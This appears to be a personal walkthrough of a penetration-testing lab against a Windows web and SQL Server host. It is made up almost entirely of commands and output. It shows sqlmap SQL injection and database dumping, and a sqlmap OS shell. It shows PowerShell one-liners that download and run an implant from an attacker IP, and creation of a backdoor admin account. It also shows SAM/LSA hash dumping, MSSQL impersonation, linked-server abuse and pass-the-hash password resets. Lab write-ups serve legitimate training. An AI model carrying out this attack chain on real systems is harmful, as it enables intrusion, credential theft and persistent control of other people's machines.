Navigate to http://192.168.173.140/login.asp

The login page is vulnerable to SQLI

Capture the request and use Sqlmap 

## SQLMap

```
sqlmap -r req.txt --batch --dbs 
```

```
sqlmap -r req.txt --batch -D music --dump
```

```
sqlmap -r req.txt --batch -D music -T users --dump
```

```
Table: users
[5 entries]
+----+-------------+--------+
| id | pass        | name   |
+----+-------------+--------+
| 0  | password    | alice  |
| 1  | mypassword  | brett  |
| 2  | 123pass123  | peter  |
| 3  | 123pass123  | eric   |
| 4  | dfdg34fdsf3 | admin  |
+----+-------------+--------+

```

![[Pasted image 20250306152704.png]]

This didn't get me much but I discovered that you can get an OS-Shell using SQLMap

```
sqlmap -r req.txt --level 5 --risk 3 --os-shell
```

```
powershell -c "(New-Object System.Net.WebClient).DownloadString('http://192.168.45.203/apollo.exe') | Out-File 'C:\apollo.exe'"
```

```
powershell -c "Start-Process 'C:\apollo.exe'"
```
```
powershell -c "(New-Object System.Net.WebClient).DownloadFile('http://192.168.45.203/apollo.exe','C:\apollo.exe'); Start-Process 'C:\apollo.exe'"

```

```
powershell -c "(New-Object System.Net.WebClient).DownloadFile('http://192.168.45.195/apollo.exe','C:\apollo.exe'); Start-Process 'C:\apollo.exe'"

```

catch the beacon and create a local admin

```
shell net user p3ta MyP@ssw0rd /add && net localgroup administrators p3ta /add && net localgroup "Remote Desktop Users" p3ta /add
```

Transfer the SAM SYSTEM and SECURITY

```
shell reg save HKLM\SAM SAM
shell reg save HKLM\SYSTEM SYSTEM
shell reg save HKLM\SECURITY SECURITY
```

```
 impacket-secretsdump LOCAL -system SYSTEM -sam SAM -security SECURITY
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Target system bootKey: 0xafcb5af00eadfdaffc70bf60ef7a917b
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:5c3e856f452d9cecc5801a954ab22122:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:2b27afbdf9dca0fe715dc999ad4832c6:::
p3ta:1001:aad3b435b51404eeaad3b435b51404ee:17878e18de38ba5cc8aa077be33a5bb6:::
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] DPAPI_SYSTEM
dpapi_machinekey:0x4e403f342a3b860481df818e69f4443c4a7c77ea
dpapi_userkey:0x496e829360963ff284f67b2c1e32e0fe1186703e
[*] NL$KM
 0000   2C AE 58 B1 26 43 47 C3  F2 6B 37 6E B7 E6 36 D4   ,.X.&CG..k7n..6.
 0010   E4 2C 27 98 86 3F FF 29  DB DD CF 1E 36 D9 A9 20   .,'..?.)....6..
 0020   0B 23 69 6C 53 2F 20 C1  38 C4 85 6F DE 01 A6 91   .#ilS/ .8..o....
 0030   0E EF 7D F7 C2 FB 54 94  4C 87 7F F5 E0 31 9A DE   ..}...T.L....1..
NL$KM:2cae58b1264347c3f26b376eb7e636d4e42c2798863fff29dbddcf1e36d9a9200b23696c532f20c138c4856fde01a6910eef7df7c2fb54944c877ff5e0319ade
[*] Cleaning up...

```

you can use SQL Server Management to change the SA password then use Impacket-Mssqlclient to access the db.

```
impacket-mssqlclient sa:'Password123'@192.168.182.140
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(SQL11\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(SQL11\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208)
[!] Press help for extra shell commands
SQL (sa  dbo@master)>

```

I also identified linked servers

![[Pasted image 20250308141516.png]]
For persistence

```
impacket-mssqlclient administrator@192.168.182.140 -hashes :5c3e856f452d9cecc5801a954ab22122 -windows-authkaloi
```

Again enumerating linked servers

```
SQL (SQL11\Administrator  dbo@master)> EXEC sp_linkedservers;
SRV_NAME           SRV_PROVIDERNAME   SRV_PRODUCT   SRV_DATASOURCE     SRV_PROVIDERSTRING   SRV_LOCATION   SRV_CAT
----------------   ----------------   -----------   ----------------   ------------------   ------------   -------
SQL11\SQLEXPRESS   SQLNCLI            SQL Server    SQL11\SQLEXPRESS   NULL                 NULL           NULL

SQL27              SQLNCLI            SQL Server    SQL27              NULL                 NULL           NULL

SQL53              SQLNCLI            SQL Server    SQL53              NULL                 NULL           NULL

```

We can impersonate as SA

```
SQL (SQL11\Administrator  dbo@master)> SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE';
name
----
SQL (SQL11\Administrator  dbo@master)> EXECUTE AS LOGIN = 'sa';
```

Enumerating users

```
SQL (sa  dbo@master)> SELECT name FROM sys.server_principals WHERE type_desc IN ('SQL_LOGIN','WINDOWS_LOGIN','WINDOWS_GROUP');
name
----------------------------------
sa

##MS_PolicyEventProcessingLogin##

##MS_PolicyTsqlExecutionLogin##

SQL11\Administrator

NT SERVICE\SQLWriter

NT SERVICE\Winmgmt

NT Service\MSSQL$SQLEXPRESS

BUILTIN\Users

NT AUTHORITY\SYSTEM

NT SERVICE\SQLTELEMETRY$SQLEXPRESS

webapp11

```

Lets try to impersonal webapp11

```
SQL (SQL11\Administrator  dbo@master)> SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE';
name
----
SQL (SQL11\Administrator  dbo@master)> EXECUTE AS LOGIN = 'webapp11';
```

It worked
```
SQL (SQL11\Administrator  dbo@master)> EXECUTE AS LOGIN = 'webapp11';
SQL (webapp11  dbo@master)> select version from openquery("SQL27", 'select @@version as version')
version                                                                                                                                                    
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
Microsoft SQL Server 2019 (RTM) - 15.0.2000.5 (X64)
        Sep 24 2019 13:48:23
        Copyright (C) 2019 Microsoft Corporation
        Express Edition (64-bit) on Windows Server 2019 Standard 10.0 <X64> (Build 17763: ) (Hypervisor)



```

We can use MSSqlPwner

```
mssqlpwner -hashes ':5c3e856f452d9cecc5801a954ab22122' 'Administrator'@192.168.182.140 -windows-auth interactive
```

Use set-link-server
```
set-link-server SQL53
```

Then change the password of the admin and log in
```
exec "net user administrator Password123"
```